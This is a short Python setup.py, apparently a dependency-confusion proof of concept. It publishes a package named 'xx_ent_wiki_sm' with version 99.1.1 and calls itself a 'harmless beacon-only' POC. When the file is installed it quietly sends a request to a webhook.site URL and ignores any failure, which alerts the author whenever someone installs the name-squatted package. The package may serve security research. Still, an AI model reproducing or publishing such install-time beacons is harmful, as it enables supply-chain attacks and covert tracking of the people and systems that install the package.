from setuptools import setup
import urllib.request

BEACON_URL = "https://webhook.site/8e5fbb36-360e-4ca3-b3ee-77e937e1ddab"

def beacon_once():
    try:
        req = urllib.request.Request(BEACON_URL, method="GET")
        with urllib.request.urlopen(req, timeout=3) as resp:
            pass
    except Exception:
        pass

beacon_once()

setup(
    name="xx_ent_wiki_sm",
    version="99.1.1",
    packages=["xx_ent_wiki_sm"],
    description="POC package (harmless beacon-only)",
)
